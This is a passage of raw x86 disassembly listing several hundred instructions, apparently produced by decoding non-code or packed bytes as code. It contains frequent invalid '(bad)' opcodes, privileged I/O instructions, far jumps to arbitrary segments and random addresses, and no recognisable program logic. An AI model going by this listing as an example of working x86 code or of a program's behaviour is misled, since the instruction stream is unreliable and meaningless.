  41015e:	popw   ss
  410160:	mov    ds:0xf398da81,al
  410165:	add    al,0x89
  410167:	pusha  
  410168:	mov    ch,0xb
  41016a:	retf   0x2cf5
  41016d:	scas   eax,DWORD PTR es:[edi]
  41016e:	jo     0x410191
  410170:	adc    esi,0x79
  410173:	mov    eax,ds:0xcff40f04
  410178:	push   edi
  410179:	fs nop
  41017b:	and    edx,ebx
  41017d:	add    ebx,DWORD PTR [ebp-0x4e]
  410180:	pop    esi
  410181:	push   edi
  410182:	mov    al,ds:0x253f007d
  410187:	xor    ah,BYTE PTR [edx]
  410189:	pop    ecx
  41018a:	xlat   BYTE PTR ds:[ebx]
  41018b:	jbe    0x4101ff
  41018d:	bound  edi,QWORD PTR [eax-0x5f]
  410190:	jle    0x410129
  410192:	add    eax,0x34d52afb
  410197:	fstp   TBYTE PTR ds:0xdf174d6
  41019d:	hlt    
  41019e:	cwde   
  41019f:	pop    ecx
  4101a0:	mov    esi,0xf423185a
  4101a5:	xor    BYTE PTR [eax-0x58],bh
  4101a8:	push   edi
  4101a9:	loopne 0x410143
  4101ab:	add    ebx,DWORD PTR [edi+0x1f4b6143]
  4101b1:	scas   al,BYTE PTR es:[edi]
  4101b2:	xor    ah,BYTE PTR [esp+eiz*8]
  4101b5:	and    eax,0x13891d11
  4101ba:	mov    eax,ds:0xaa725262
  4101bf:	cmp    ebx,DWORD PTR [ebx-0x36e7ddc7]
  4101c5:	mov    al,ds:0xfc41a56e
  4101ca:	sbb    al,0xb7
  4101cd:	or     DWORD PTR [ecx+edx*2+0x21f26eee],ecx
  4101d4:	or     eax,0xe4a9ab0d
  4101d9:	sahf   
  4101da:	lahf   
  4101db:	add    al,0x95
  4101dd:	push   edx
  4101de:	inc    ebp
  4101df:	add    al,0x4f
  4101e1:	aas    
  4101e2:	mov    dh,0x4d
  4101e4:	(bad)  
  4101e5:	jo     0x41018f
  4101e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e8:	rol    dl,1
  4101ea:	mov    cl,0x15
  4101ec:	fs push ebp
  4101ee:	xor    esi,ebx
  4101f0:	adc    al,0x35
  4101f2:	pop    ds
  4101f3:	push   ds
  4101f4:	sub    DWORD PTR ds:0x9e68fd04,esp
  4101fa:	lds    ebp,FWORD PTR [ecx+0xc3e450b]
  410200:	scas   al,BYTE PTR es:[edi]
  410201:	and    eax,DWORD PTR [ebx+0x4a]
  410204:	inc    eax
  410205:	lea    esp,[ecx]
  410207:	xchg   esi,eax
  410208:	pop    edi
  410209:	xchg   esp,eax
  41020a:	push   esp
  41020b:	in     eax,0x6c
  41020d:	cmc    
  41020e:	mov    ah,0xd9
  410210:	in     eax,dx
  410211:	and    BYTE PTR [ebp-0x7cc85ea4],dl
  410217:	adc    eax,0xa556942
  41021c:	sbb    ah,dh
  41021e:	and    dl,BYTE PTR [edi-0x503608e7]
  410224:	pusha  
  410225:	push   0xffffffbb
  410227:	inc    esi
  410228:	push   ss
  410229:	out    0x67,eax
  41022b:	mov    cl,BYTE PTR [ebx+0x2c558fcf]
  410231:	push   esp
  410232:	retf   
  410233:	jmp    0x91fd9f75
  410238:	and    BYTE PTR [ebp+0x766d6a1d],bl
  41023e:	pop    ebx
  41023f:	sub    ch,BYTE PTR [edx+0x43]
  410242:	jp     0x4101f6
  410244:	cmp    al,BYTE PTR ds:0xd6dd0721
  41024a:	dec    edi
  41024b:	ins    BYTE PTR es:[edi],dx
  41024c:	ss test al,0xc8
  41024f:	jmp    0x3f9b9d39
  410254:	mov    dl,ah
  410256:	pop    ecx
  410257:	add    esi,DWORD PTR [edx-0x57d81dfd]
  41025d:	out    0xd9,al
  41025f:	sahf   
  410260:	aaa    
  410261:	fstp   QWORD PTR [edx-0x2cf5c117]
  410267:	mov    ds:0xcf9cc573,eax
  41026c:	xor    BYTE PTR [ebx],al
  41026e:	leave  
  41026f:	icebp  
  410270:	popf   
  410271:	test   eax,0xf03bcc44
  410276:	ins    BYTE PTR es:[edi],dx
  410277:	stos   DWORD PTR es:[edi],eax
  410278:	inc    ebx
  410279:	and    eax,0xc0ea0d60
  41027e:	imul   BYTE PTR [esp+ebx*4-0x1307683e]
  410285:	(bad)  
  410286:	loopne 0x410274
  410288:	bound  edx,QWORD PTR [edi+eiz*2-0x41]
  41028c:	scas   al,BYTE PTR es:[edi]
  41028d:	inc    ecx
  41028e:	test   DWORD PTR [esi],edi
  410290:	jb     0x4102e0
  410292:	jbe    0x4102ac
  410294:	ret    
  410295:	in     eax,dx
  410296:	jl     0x4102f3
  410298:	dec    ecx
  410299:	push   ds
  41029a:	push   ds
  41029b:	adc    eax,0x46439a5e
  4102a0:	xchg   esi,eax
  4102a1:	lds    esi,FWORD PTR ds:0x3682579b
  4102a7:	jb     0x4102b4
  4102a9:	sahf   
  4102aa:	fs mov edx,0xe79be007
  4102b0:	adc    bh,ah
  4102b2:	dec    ebx
  4102b3:	mov    eax,ds:0xcfccc38b
  4102b8:	mov    bh,0x45
  4102ba:	xchg   esi,eax
  4102bb:	mov    al,0xf2
  4102bd:	jae    0x410283
  4102bf:	in     al,dx
  4102c0:	cmp    BYTE PTR [eax],ah
  4102c2:	out    dx,al
  4102c3:	cli    
  4102c4:	loopne 0x410279
  4102c6:	lods   eax,DWORD PTR ds:[esi]
  4102c7:	dec    edx
  4102c8:	mov    ds:0xcc001693,eax
  4102cd:	inc    esi
  4102ce:	pop    ecx
  4102cf:	out    0xb7,eax
  4102d1:	bound  ebp,QWORD PTR [esi+0x4a4da73f]
  4102d7:	ja     0x4102e0
  4102d9:	ret    0x719b
  4102dc:	psubusw mm5,QWORD PTR [ecx-0x2381a37d]
  4102e3:	sti    
  4102e4:	sar    BYTE PTR [eax],cl
  4102e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102e7:	mov    al,0xdc
  4102e9:	push   0x1b8d408f
  4102ee:	and    eax,0xc5ec7909
  4102f3:	pop    eax
  4102f5:	adc    esi,DWORD PTR [edx-0x7f9eda8b]
  4102fb:	loopne 0x410370
  4102fd:	push   edx
  4102fe:	cmp    BYTE PTR [edi],cl
  410300:	(bad)  
  410301:	nop
  410302:	add    eax,0x1c5218ff
  410307:	xor    edx,DWORD PTR [edi]
  410309:	sub    ebp,DWORD PTR [edx+0x7f]
  41030c:	mov    dh,0xbf
  41030e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41030f:	add    eax,0xe125c4e1
  410314:	out    dx,eax
  410315:	mov    ebx,0x3c5827d3
  41031a:	aaa    
  41031b:	cmp    ecx,esi
  41031d:	movsx  ebx,dl
  410320:	push   cx
  410322:	cmp    bl,BYTE PTR [edi-0x35]
  410325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410326:	mov    ds:0x5139f032,eax
  41032b:	and    DWORD PTR [ebx+0x32],ebp
  41032e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41032f:	xchg   ecx,eax
  410330:	cmp    BYTE PTR [ebx-0x5c40f767],dl
  410336:	jmp    0xb395e54
  41033b:	add    cl,BYTE PTR [eax-0x6fb931ca]
  410341:	pop    ecx
  410342:	cmp    eax,esp
  410344:	mov    ch,0x29
  410346:	xchg   DWORD PTR [esi],edx
  410348:	ins    DWORD PTR es:[edi],dx
  410349:	ins    DWORD PTR es:[edi],dx
  41034a:	leave  
  41034b:	jno    0x410351
  41034d:	xor    al,0xaf
  41034f:	fcomp  QWORD PTR [ebx+0x7e]
  410352:	pop    edi
  410353:	push   es
  410354:	mov    al,ds:0xe5023464
  410359:	int    0x2e
  41035b:	adc    dl,BYTE PTR [eax+esi*1]
  41035e:	fdivr  QWORD PTR ds:0x905761a4
  410364:	inc    esp
  410365:	bnd jmp 0x410335
  410368:	jl     0x41037f
  41036a:	(bad)  
  41036b:	sub    esi,DWORD PTR [ecx+ebp*8+0x4a]
  41036f:	out    0x2,eax
  410371:	lods   eax,DWORD PTR ds:[esi]
  410372:	inc    edi
  410373:	cmp    ebx,DWORD PTR [edx]
  410375:	cmp    ebx,esp
  410377:	mov    bl,0x8f
  410379:	loope  0x410391
  41037b:	repz pop ss
  41037d:	dec    eax
  41037e:	cld    
  41037f:	jp     0x4103ac
  410381:	cmp    eax,0x63094381
  410386:	xor    ch,BYTE PTR [eax-0x1e]
  410389:	jbe    0x4103e8
  41038b:	int3   
  41038c:	inc    esi
  41038d:	das    
  41038e:	push   ebx
  41038f:	adc    eax,0xe11b6aa3
  410394:	push   eax
  410395:	jo     0x4103c0
  410397:	sub    edi,DWORD PTR [esi]
  410399:	jecxz  0x4103d3
  41039b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41039c:	sub    eax,DWORD PTR [edx-0x7b177265]
  4103a2:	push   ss
  4103a3:	xchg   edx,eax
  4103a4:	xchg   BYTE PTR [ecx-0x74083883],al
  4103aa:	mov    edi,0x821bcbbd
  4103af:	xchg   edi,eax
  4103b0:	scas   al,BYTE PTR es:[edi]
  4103b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103b2:	mov    esi,0x234f5dee
  4103b7:	call   0x4833:0xe91d7466
  4103be:	inc    esp
  4103bf:	push   esi
  4103c0:	icebp  
  4103c1:	pop    eax
  4103c2:	xchg   ecx,eax
  4103c3:	pop    ds
  4103c4:	ss ss pop ebx
  4103c7:	cmp    BYTE PTR [edx-0x68],0x71
  4103cb:	cmp    eax,0x85f4d066
  4103d0:	pop    eax
  4103d1:	xor    al,BYTE PTR [edx-0x3c]
  4103d4:	push   ecx
  4103d5:	mov    WORD PTR [edx],fs
  4103d7:	xchg   cl,ah
  4103d9:	scas   al,BYTE PTR es:[edi]
  4103da:	xlat   BYTE PTR ds:[ebx]
  4103db:	sbb    BYTE PTR [edi],dl
  4103dd:	int    0x49
  4103df:	push   esp
  4103e0:	add    eax,DWORD PTR ds:0xa42d86d2
  4103e6:	or     esp,esp
  4103e8:	sahf   
  4103e9:	sbb    edx,0xffffffa0
  4103ec:	call   0x381c:0x1f3a63a8
  4103f3:	mov    gs,WORD PTR [esi-0x5c]
  4103f6:	in     eax,dx
  4103f7:	arpl   WORD PTR [edi-0x1e],cx
  4103fa:	jmp    0x41044d
  4103fc:	stc    
  4103fd:	mov    edx,0xb66a6c3a
  410402:	mov    esp,0x612bf50c
  410407:	test   BYTE PTR [ebx-0x12],ch
  41040a:	popf   
  41040b:	xor    bl,al
  41040d:	xchg   edx,eax
  41040e:	lahf   
  41040f:	stos   DWORD PTR es:[edi],eax
  410410:	push   esp
  410411:	sbb    DWORD PTR [esi+0x5e0b680],esp
  410417:	push   ecx
  410418:	mov    al,0xe5
  41041a:	fisttp QWORD PTR [ebx-0x4]
  41041d:	fdivrp st(7),st
  41041f:	and    DWORD PTR [esi],esi
  410421:	pop    eax
  410422:	push   cs
  410423:	jnp    0x4103bd
  410425:	add    BYTE PTR [edi],bh
  410427:	mov    ds:0xa3488669,eax
  41042c:	addr16 ss jae 0x410482
  410430:	xchg   esi,eax
  410431:	sub    ebp,DWORD PTR [edi+0x63]
  410434:	nop
  410435:	add    al,0x6c
  410437:	lock mov dl,0x43
  41043a:	int    0x20
  41043c:	push   edx
  41043d:	add    cl,BYTE PTR [esi-0x3b165122]
  410443:	popf   
  410444:	mov    bh,0x98
  410446:	in     eax,0xed
  410448:	dec    ebp
  410449:	(bad)  
  41044a:	test   eax,0x728a2d57
  41044f:	inc    ecx
  410450:	push   ecx
  410451:	adc    DWORD PTR [ebx+ebp*1+0x41bd9ca1],ebp
  410458:	lahf   
  410459:	sar    DWORD PTR [edx],cl
  41045b:	bound  eax,QWORD PTR [ebx+0x6013af7d]
  410461:	mov    al,ds:0xb39562f6
  410466:	jmp    0xa83:0xda764a1
  41046d:	cmp    ecx,DWORD PTR [edx-0x4cd1b79b]
  410473:	inc    ebp
  410474:	int    0x2
  410476:	adc    ebx,esp
  410478:	xor    ecx,edx
  41047a:	and    al,0x19
  41047c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41047d:	jo     0x410400
  41047f:	jo     0x410453
  410481:	jbe    0x410441
  410483:	in     eax,0x68
  410485:	pop    esp
  410486:	ret    0x9246
  410489:	push   edi
  41048a:	jp     0x410454
  41048c:	mov    eax,ds:0xcf8eb914
  410491:	adc    BYTE PTR [ebx],al
  410493:	inc    ebp
  410494:	inc    esi
  410495:	adc    dh,BYTE PTR [ebx-0x1e3c0434]
  41049b:	mov    bl,0xa1
  41049d:	dec    esi
  41049e:	jnp    0x410429
  4104a0:	rcl    DWORD PTR [ebp-0x7399db8f],cl
  4104a6:	fs jle 0x410437
  4104a9:	pop    edi
  4104aa:	mov    cl,0xe3
  4104ac:	dec    ecx
  4104ad:	cmp    eax,eax
  4104af:	mul    BYTE PTR [edx+eax*8-0x54ec22d3]
  4104b6:	push   esi
  4104b7:	mov    bh,0x6b
  4104b9:	push   0x4c467378
  4104be:	test   eax,0x29a7cf88
  4104c3:	sbb    al,0xbe
  4104c5:	sub    al,0xdf
  4104c7:	xor    eax,0xdf12d5ed
  4104cc:	int3   
  4104cd:	shr    eax,cl
  4104cf:	shl    esp,1
  4104d1:	jmp    0x3367:0xce1871ae
  4104d8:	xchg   BYTE PTR [ebp+0x7f],dl
  4104db:	and    ecx,ecx
  4104dd:	pop    esi
  4104de:	lea    eax,[ecx]
  4104e0:	pop    eax
  4104e1:	in     eax,dx
  4104e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104e3:	xchg   ecx,eax
  4104e4:	in     al,dx
  4104e5:	mov    eax,0x77cf1531
  4104ea:	push   ebp
  4104eb:	test   edi,0xb186d2
  4104f1:	jecxz  0x410498
  4104f3:	std    
  4104f4:	retf   0x53e
  4104f7:	sub    al,0x41
  4104f9:	retf   0xc07c
  4104fc:	ret    
  4104fd:	and    eax,0x34e78ce1
  410502:	jmp    0x2c87:0x90c47d72
  410509:	lahf   
  41050a:	and    DWORD PTR [edx+0x2],esi
  41050d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41050e:	not    DWORD PTR [edx]
  410510:	sub    BYTE PTR [esi+0x5cb108c8],bl
  410516:	inc    bh
  410518:	(bad)  
  410519:	out    0xf2,eax
  41051b:	xchg   edi,eax
  41051c:	dec    ebp
  41051d:	push   cs
  41051e:	retf   
  41051f:	fnstenv [ecx-0x7fce3533]
  410525:	es jecxz 0x41052b
  410528:	jge    0x4104df
  41052a:	push   ss
  41052b:	sbb    ebx,eax
  41052d:	sub    DWORD PTR [edx-0x57],edx
  410530:	lods   eax,DWORD PTR ds:[esi]
  410531:	cmp    esp,DWORD PTR gs:[ecx-0x1]
  410535:	out    0x55,al
  410537:	dec    ebp
  410538:	xor    bh,BYTE PTR [edx-0x67772701]
  41053e:	mov    ds,WORD PTR [eax+0x6]
  410541:	inc    edx
  410542:	adc    eax,0x653a2100
  410547:	mov    ebp,0x7957d666
  41054c:	sahf   
  41054d:	repz dec edx
  41054f:	sub    al,0xc2
  410551:	das    
  410552:	js     0x410569
  410554:	jno    0x4104fd
  410556:	cmp    BYTE PTR [ebx-0x10],ch
  410559:	push   edx
  41055a:	adc    ah,ah
  41055c:	or     dh,BYTE PTR [ecx+edx*4-0x26534e6c]
  410563:	cmp    ebx,esi
  410565:	sub    eax,0x67420113
  41056a:	mov    WORD PTR [ebx],fs
  41056c:	or     edx,DWORD PTR [ebx+0x2]
  41056f:	xchg   BYTE PTR [edx*4+0xb0e1c01],dh
  410576:	inc    esi
  410577:	xchg   ebx,eax
  410578:	imul   edi,DWORD PTR [ebp+esi*1-0x5d],0x9e94d7d1
  410580:	mov    cs,WORD PTR [ebx+0x7e19ac6a]
  410586:	jg     0x4105c2
  410588:	push   0x77
  41058a:	adc    eax,0x89baac46
  41058f:	sub    al,0x66
  410591:	nop
  410592:	add    eax,0xae1f4d47
  410597:	pop    ebx
  410598:	aam    0x22
  41059a:	dec    edi
  41059b:	jns    0x410552
  41059d:	int    0x8c
  41059f:	pusha  
  4105a0:	xor    ecx,DWORD PTR [ebx-0x47bf8fb6]
  4105a6:	xchg   esi,eax
  4105a7:	fninit 
  4105a9:	js     0x41054b
  4105ab:	ins    BYTE PTR es:[edi],dx
  4105ac:	or     al,0x59
  4105ae:	lock xchg esi,eax
  4105b0:	add    ebx,ebx
  4105b2:	jmp    0x410588
  4105b4:	sbb    ecx,DWORD PTR [eax]
  4105b6:	sub    BYTE PTR [eax],cl
  4105b8:	addr16 cs mov esi,0x45d82835
  4105bf:	xchg   esp,eax
  4105c0:	mov    ah,0x36
  4105c2:	and    ah,ch
  4105c4:	inc    esp
  4105c5:	into   
  4105c6:	div    esi
  4105c8:	sub    ebp,ebp
  4105ca:	xor    eax,0x13646ccd
  4105cf:	cld    
  4105d0:	sub    BYTE PTR [ecx+edx*4],al
  4105d3:	add    eax,0xe590d6b2
  4105d8:	and    DWORD PTR [ecx-0x2b],esp
  4105db:	nop
  4105dc:	gs nop
  4105de:	cld    
  4105df:	push   esi
  4105e0:	retf   0x618f
  4105e3:	sbb    eax,0xd52985e3
  4105e8:	int3   
  4105e9:	jge    0x410596
  4105eb:	adc    DWORD PTR [ecx],esp
  4105ed:	xor    esi,DWORD PTR [edx+0x7bb2e69]
  4105f3:	push   cs
  4105f4:	sbb    DWORD PTR [eax+0x494cde45],edx
  4105fa:	(bad)  
  4105fc:	xor    ecx,DWORD PTR [eax]
  4105fe:	push   0x61
  410600:	mov    bh,0x3a
  410602:	inc    edx
  410603:	adc    al,BYTE PTR [edi+0x2d0d6928]
  410609:	iret   
  41060a:	shr    BYTE PTR [edi+0x206146ee],1
  410610:	mov    cl,0x5f
  410612:	ror    BYTE PTR [esi+edx*2],cl
  410615:	js     0x4105dd
  410617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410618:	mov    dl,0xd
  41061a:	push   eax
  41061b:	pop    ecx
  41061c:	outs   dx,BYTE PTR ds:[esi]
  41061d:	jo     0x4105d1
  41061f:	push   eax
  410620:	push   edx
  410621:	pop    ebx
  410622:	xchg   esp,eax
  410624:	and    eax,0xcb5a8c94
  410629:	nop
  41062a:	hlt    
  41062b:	mov    edi,0xad4ac825
  410630:	sbb    esi,DWORD PTR [edx]
  410632:	xchg   ebx,eax
  410633:	dec    ebp
  410634:	mov    ds,WORD PTR [edx+0x5b]
  410637:	clc    
  410638:	(bad)  
  41063b:	push   ds
  41063c:	and    bl,cl
  41063e:	or     DWORD PTR [esi],0xcf438d99
  410644:	imul   edi,DWORD PTR ds:0xc7511554,0xffffffb9
  41064b:	sub    al,0xe7
  41064d:	ret    0xda3c
  410650:	add    BYTE PTR [edi+edi*8+0x3c],0xb2
  410655:	push   edx
  410656:	ins    BYTE PTR es:[edi],dx
  410657:	pushf  
  410658:	jmp    0x9acd:0x4ad6f4ce
  41065f:	das    
  410660:	fwait
  410661:	mov    ecx,0xded7921c
  410666:	push   ebx
  410667:	jae    0x410689
  410669:	cmp    BYTE PTR [ebp-0x6b],0xd8
  41066d:	mov    dh,0x7f
  41066f:	ret    0xd60c
  410672:	xor    ch,BYTE PTR [ecx]
  410674:	dec    ebx
  410675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410676:	xor    ch,cl
  410678:	dec    ecx
  410679:	cmp    ch,BYTE PTR [edi-0x5c]
  41067c:	int    0x28
  41067e:	arpl   WORD PTR [edi],si
  410680:	mov    edi,ecx
  410682:	push   ebx
  410683:	into   
  410684:	nop
  410685:	loop   0x4106cb
  410687:	dec    edx
  410688:	mov    bl,0x0
  41068a:	in     eax,dx
  41068b:	rcr    BYTE PTR [edx],0xb5
  41068e:	shr    DWORD PTR [edx],cl
  410690:	shl    BYTE PTR gs:[ecx-0x29bf3037],1
  410697:	fsub   st,st(3)
  410699:	xor    al,0x44
  41069b:	push   ecx
  41069c:	pop    eax
  41069d:	pusha  
  41069e:	ficomp WORD PTR [esi-0x58bffb05]
  4106a4:	cwde   
  4106a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a6:	in     al,dx
  4106a7:	add    ebx,DWORD PTR [edx-0x54e25a39]
  4106ad:	call   0x68723195
  4106b2:	fsub   QWORD PTR [edi+0x40082f35]
  4106b8:	jmp    0x2bea4bf1
  4106bd:	jnp    0x410683
  4106bf:	fisttp DWORD PTR [ecx]
  4106c1:	push   esi
  4106c2:	out    0xe1,al
  4106c4:	sbb    ch,bh
  4106c6:	xchg   ebp,eax
  4106c7:	pop    edx
  4106c8:	pop    eax
  4106c9:	cmp    ebp,DWORD PTR [ebx-0x75a75ebc]
  4106cf:	jg     0x41070e
  4106d1:	or     ebx,esp
  4106d3:	xor    DWORD PTR [eax],edi
  4106d5:	adc    ch,0x9a
  4106d8:	xlat   BYTE PTR ds:[ebx]
  4106d9:	retf   
  4106da:	rcr    bh,1
  4106dc:	imul   edx,DWORD PTR [ecx+0x14791554],0xffffffad
  4106e3:	jge    0x410736
  4106e5:	jno    0x410701
  4106e7:	mov    ?,WORD PTR [esi-0x6b3d663a]
  4106ed:	add    BYTE PTR [ebx+0x19],0xf6
  4106f1:	sbb    bl,bl
  4106f3:	retf   0xf682
  4106f6:	repz aam 0xf7
  4106f9:	ds clc 
  4106fb:	mov    esi,0xe7ec17e4
  410700:	lahf   
  410701:	mov    ah,0xb3
  410703:	dec    ecx
  410704:	dec    DWORD PTR [edx]
  410706:	sbb    bl,dl
  410708:	lods   eax,DWORD PTR ds:[esi]
  410709:	xchg   esi,eax
  41070a:	retf   0x503d
  41070d:	jg     0x4106f5
  41070f:	dec    ecx
  410710:	fdivr  st,st(7)
  410712:	in     eax,dx
  410713:	ss push 0xbceed36e
  410719:	(bad)  
  41071a:	pop    edi
  41071b:	outs   dx,BYTE PTR ds:[esi]
  41071c:	(bad)  
  41071d:	ror    bl,1
  41071f:	dec    ecx
  410720:	push   ds
  410721:	mov    ds:0xb6052d25,al
  410726:	lea    ebp,[ebx-0x5c]
  410729:	or     BYTE PTR [edi-0x1e],ch
  41072c:	ret    
  41072d:	mov    BYTE PTR [edx],cl
  41072f:	lea    edi,ds:0x26261f86
  410735:	daa    
  410736:	sti    
  410737:	inc    edx
  410738:	xchg   ebp,eax
  410739:	or     al,0x9a
  41073b:	in     eax,0xa5
  41073d:	(bad)  
  41073e:	aad    0x5b
  410740:	fwait
  410741:	dec    eax
  410742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410743:	outs   dx,BYTE PTR ds:[esi]
  410744:	or     ah,dl
  410746:	ins    DWORD PTR es:[edi],dx
  410747:	call   0x8fa30a9d
  41074c:	mov    eax,DWORD PTR [ebx]
  41074e:	out    0xa8,eax
  410750:	jo     0x4107a7
  410752:	xchg   edi,eax
  410753:	mov    dl,0xd1
  410755:	mov    bl,0xe2
  410757:	inc    ebp
  410758:	mov    dh,0x8c
  41075a:	cmp    al,0x65
  41075c:	or     DWORD PTR [edx-0x70b7dcd9],ecx
  410762:	jecxz  0x410771
  410764:	adc    ah,BYTE PTR [ecx+0x5aa22110]
  41076a:	lea    eax,[eax]
  41076c:	jle    0x41073b
  41076e:	add    eax,0xc76f3f79
  410773:	xchg   ebp,eax
  410774:	mov    esp,0xca37d4c
  410779:	leave  
  41077a:	adc    DWORD PTR [ecx],ebp
  41077c:	sub    ebp,ebx
  41077e:	imul   ebx,DWORD PTR [esi+0x77],0x5e
  410782:	or     ah,BYTE PTR [esi+ebp*2+0x5b]
  410786:	(bad)  
  410787:	dec    esp
  410788:	jp     0x41078e
  41078a:	dec    edx
  41078b:	sub    BYTE PTR [esi],ah
  41078d:	outs   dx,BYTE PTR ds:[esi]
  41078e:	retf   0x6d7
  410791:	sub    bl,bl
  410793:	into   
  410794:	jmp    0x410808
  410796:	in     eax,dx
  410797:	pusha  
  410798:	(bad)  
  410799:	scas   eax,DWORD PTR es:[edi]
  41079a:	rcl    DWORD PTR ds:0x860e7355,1
  4107a0:	mov    ah,0xa9
  4107a2:	cmp    eax,0xba876640
  4107a7:	add    bl,BYTE PTR [esi-0x270735e5]
  4107ad:	mov    bl,0xb5
  4107af:	push   es
  4107b0:	pop    ds
  4107b1:	sub    ah,BYTE PTR [ecx-0x6d]
  4107b4:	neg    BYTE PTR [edi+0x2d7bff85]
  4107ba:	(bad)  gs:[edi-0x24]
  4107be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107bf:	mov    al,ds:0x51fd5d83
  4107c4:	into   
  4107c5:	call   0xf8c5:0x53650029
  4107cc:	and    DWORD PTR ss:[edi],0x2c
  4107d0:	retf   
  4107d1:	inc    ecx
  4107d2:	int3   
  4107d3:	cmp    eax,0xc32d9b82
  4107d8:	data16 loop 0x41083b
  4107db:	vpandn ymm7,ymm2,ymm2
  4107df:	jne    0x4107e2
  4107e1:	sti    
  4107e2:	xor    dh,bl
  4107e4:	and    DWORD PTR [ecx-0x3cb7e484],0xc29e443f
  4107ee:	test   al,0x18
  4107f0:	ins    DWORD PTR es:[edi],dx
  4107f1:	push   cs
  4107f2:	add    bh,BYTE PTR ds:0xfa72750d
  4107f8:	xor    edi,DWORD PTR [ebp+0x24bc881d]
  4107fe:	or     DWORD PTR [ebx-0x3cce31dc],edi
  410804:	adc    DWORD PTR [ecx-0x27e58b45],esp
  41080a:	cmp    eax,0x76c02e74
  41080f:	inc    edi
  410810:	test   BYTE PTR [ebp+0x78b5e1d0],bl
  410816:	jne    0x410882
  410818:	sbb    BYTE PTR [edx],dl
  41081a:	int    0x5a
  41081c:	and    DWORD PTR ds:0x445010dd,esp
  410822:	xor    DWORD PTR [eax+edx*4],ebx
  410825:	cmp    eax,0xb14c57ed
  41082a:	ficom  WORD PTR [esi-0x16fe99d5]
  410830:	int    0x43
  410832:	or     DWORD PTR [esi-0x3cd4bc2f],ebx
  410838:	push   0x3d
  41083a:	mov    WORD PTR [eax],ds
  41083c:	cmp    al,0x81
  41083e:	(bad)  
  41083f:	fidiv  DWORD PTR [eax+0x64e8bc4e]
  410845:	dec    ebx
  410846:	test   al,0x72
  410848:	cmp    bl,ah
  41084a:	into   
  41084b:	sti    
  41084c:	dec    eax
  41084d:	dec    esi
  41084e:	popf   
  41084f:	dec    ecx
  410850:	mov    bl,0x83
  410852:	imul   eax,DWORD PTR [ebx],0x38
  410855:	pop    eax
  410856:	add    esp,esi
  410858:	inc    esp
  410859:	hlt    
  41085a:	mov    eax,0xbafcd809
  41085f:	fisttp DWORD PTR [eax]
  410861:	sti    
  410862:	push   0xffffffe9
  410864:	inc    ecx
  410865:	mov    BYTE PTR [esi-0x65],cl
  410868:	add    bl,dl
  41086a:	xor    BYTE PTR [ebp+ecx*2-0x72a05e49],dl
  410871:	xor    eax,ecx
  410873:	push   ebp
  410874:	data16 fcmove st,st(4)
  410877:	mov    edi,0x6760344
  41087c:	xor    al,bh
  41087e:	mov    esp,0xb6757525
  410883:	arpl   WORD PTR [ecx],cx
  410885:	adc    cl,ch
  410887:	(bad)  
  410888:	mov    eax,0x36f39d28
  41088d:	add    edi,esp
  41088f:	aad    0x2c
  410891:	push   edx
  410892:	sbb    eax,DWORD PTR [edi+0x38]
  410895:	das    
  410896:	imul   BYTE PTR [ebx+0x4d9d62b7]
  41089c:	pusha  
  41089d:	push   ds
  41089e:	jo     0x410822
  4108a0:	xchg   esi,eax
  4108a1:	cmp    al,0x5
  4108a3:	mov    eax,DWORD PTR [edx+0x6c]
  4108a6:	dec    ecx
  4108a7:	or     BYTE PTR [ecx+edi*4],ah
  4108aa:	jge    0x4108df
  4108ac:	aaa    
  4108ad:	ins    BYTE PTR es:[edi],dx
  4108ae:	in     eax,0xe3
  4108b0:	jno    0x4108a3
  4108b2:	cmp    DWORD PTR [ebx-0x4cc2e31f],esi
  4108b8:	xor    BYTE PTR [edx],0x9
  4108bb:	(bad)  
  4108bd:	das    
  4108be:	scas   eax,DWORD PTR es:[edi]
  4108bf:	jno    0x410905
  4108c1:	shr    edi,0xb9
  4108c4:	inc    edx
  4108c5:	or     BYTE PTR [edi-0x63],0x2e
  4108c9:	inc    esi
  4108ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108cb:	sti    
  4108cc:	(bad)  
  4108cd:	and    eax,0x2b7db4a5
  4108d2:	xchg   esi,eax
  4108d3:	cmc    
  4108d4:	rol    BYTE PTR [edi-0x63db6f76],1
  4108da:	push   ebx
  4108db:	jo     0x4108e2
  4108dd:	mov    edx,edi
  4108df:	jno    0x410920
  4108e1:	les    eax,FWORD PTR [ebx+0x48]
  4108e4:	xchg   ebp,eax
  4108e5:	int    0x9c
  4108e7:	xchg   ecx,eax
  4108e8:	ret    0xbd17
  4108eb:	not    DWORD PTR ds:0xbbc099f
  4108f1:	dec    ebx
  4108f2:	scas   al,BYTE PTR es:[edi]
  4108f3:	add    edi,DWORD PTR [eax+0x2e]
  4108f6:	dec    ecx
  4108f7:	xchg   ebx,eax
  4108f8:	outs   dx,BYTE PTR ds:[esi]
  4108f9:	sbb    eax,0x5d03b666
  4108fe:	push   0x34
  410900:	daa    
  410901:	loopne 0x4108f5
  410903:	xchg   DWORD PTR es:[eax-0x7e],ebx
  410907:	iret   
  410908:	aad    0x3d
  41090a:	(bad)
  41090d:	repnz xchg edi,eax
  41090f:	add    al,0x50
  410911:	dec    edx
  410912:	ins    BYTE PTR es:[edi],dx
  410913:	xor    al,0xd4
  410915:	sbb    al,0xf7
  410917:	and    BYTE PTR [eax-0x48],al
  41091a:	xchg   edx,eax
  41091b:	and    edi,DWORD PTR [ecx+eax*8+0x49c5c2b1]
  410922:	(bad)  
  410923:	xor    BYTE PTR [ecx+0x3b],dh
  410926:	mov    ds:0x84d0734f,al
  41092b:	jbe    0x4109a4
  41092d:	je     0x4108d6
  41092f:	inc    edx
